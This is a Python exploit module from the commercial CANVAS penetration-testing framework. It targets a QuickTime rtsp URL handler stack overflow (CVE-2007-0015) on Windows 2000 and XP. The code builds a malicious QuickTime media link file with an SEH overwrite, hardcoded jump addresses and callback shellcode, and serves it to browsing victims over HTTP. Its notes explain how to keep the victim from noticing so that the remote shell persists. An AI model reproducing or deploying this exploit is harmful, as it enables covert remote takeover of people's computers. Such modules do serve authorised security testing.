#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside

NAME='Apple QuickTime rtsp URL Handler Overflow'
DESCRIPTION='Apple QuickTime rtsp URL Handler Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Apple"
DOCUMENTATION['Date public']=''
DOCUMENTATION['References']='http://projects.info-pull.com/moab/MOAB-01-01-2007.html'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION["CVE Name"] = "CVE-2007-0015"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0015"
DOCUMENTATION['CVSS'] = 6.8


VERSION='1.0'
GTK2_DIALOG='dialog.glade2'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP','2003']
PROPERTY['DELIVERY']='HTTP'

NOTES="""
Using a CreateThread shellcode allows QuickTime window not to freeze, so that
the user doesn't notice much except the window appearing and disappearing.
That way we keep our shell because it is quite unlikely that he will check the
process manager to see if QuickTime is still running (anyway a QuickTime process
usually runs in the background).

Tested on:
Apple QuickTime 7.1.3.100 on Windows 2000 Server English SP4 UP2DATE
Apple QuickTime 7.1.3.100 on Windows XP Professional SP2 English UP2DATE (IE 7.0)

Usage:
./commandlineInterface.py -p 5555 -v 1 -i fromcreatethread
./exploits/httpserver/httpserver.py -v 1 -O singleexploit:qt_rtsp -O qt_rtsp_clientversion:2 -l 10.10.11.1 -d 5555 -p 8080
"""

CHANGELOG="""
"""

targets = {
    0:['Autodetect (N/A)',0],
    1:['Apple QuickTime 7.1.3.100 on Windows 2000',0x013f41a1], #jmp edi
    2:['Apple QuickTime 7.1.3.100 on Windows XP SP2 (DEP AlwaysOff or OptIn)',0x7ffc07a4], #pop&pop&ret
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.clientversion=None
        self.badstring='\x00:/"<>%&\\\n\r '
        self.subesp=0
        self.name=NAME 
        self.filename='qtmedia.qtl'
        self.listenerArgsDict['fromcreatethread']=1
        return

    def makefile(self):
        self.description,self.eip=targets[self.version]
        payload=''
        payload+='A'*0x113
        payload+='BBB\xff' #access violation
        payload+='C'*0x210
        payload+='\xeb\x06' #jmp over
        payload+='EE'
        payload+=struct.pack('<L',self.eip) #SEH
        #payload+='\xcc'+self.shellcode
        payload+=self.shellcode
        #print repr(self.shellcode)
        filedata="""<?xml version="1.0"?> 
<?quicktime type="application/x-quicktime-media-link"?>
<embed autoplay="true" moviename="none" qtnext="none" type="video/quicktime" src="rtsp://JMPEBX:PAYLOAD" />
""".replace('JMPEBX','\xff\xe3').replace('PAYLOAD',payload)
        return filedata

    def makesploit(self,clientheader,clientbody):
        self.getArgs()
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.filename):
            self.createShellcode()
            sploitstring=self.makefile()
            h.addHeader('Content-type','application/x-quicktimeplayer')
            b.setBody(sploitstring)
        else:
            self.log('Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','binary/octet-stream')
        return h,b

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def createShellcode(self):
        self.shellcode=self.createHeapSafeInject(self.badstring,self.callback.ip,self.callback.port)
        return self.shellcode

    def getArgs(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        self.clientversion=self.argsDict.get('qt_rtsp_clientversion',self.clientversion)
        print 'filename=%s clientversion=%s'%(self.filename,self.clientversion)
        if self.clientversion!=None:
            self.version=int(self.clientversion)
        return 
        
    def displayVersions(self):
        for v in self.versions.keys():
            print 'Version %d: %s'%(v,self.versions[v][0])

    def run(self):
        self.getArgs()
        filedata=self.makefile()
        self.log('Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.filename))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
